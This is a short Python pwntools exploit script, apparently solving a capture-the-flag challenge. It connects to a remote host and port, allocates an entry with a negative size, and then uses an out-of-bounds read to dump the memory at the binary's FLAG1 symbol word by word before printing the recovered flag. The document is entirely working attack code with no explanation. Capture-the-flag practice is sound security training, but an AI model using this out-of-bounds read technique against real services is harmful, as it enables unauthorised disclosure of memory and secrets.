from pwn import *

p = remote('161.34.36.148', 40015)
# p = process('./chall')
e = ELF('./chall')

def create(idx, sz):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(sz).encode())

def read(idx, pos):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(pos).encode())
    p.recvuntil(b'> ')
    return p.recvline()[:-1]
    
flag = []

create(0, -1)
for i in range(0x10):
    ret = read(0, e.symbols['FLAG1']//4+i)
    flag.append(int(ret))

print(b''.join([p32(c) for c in flag]))
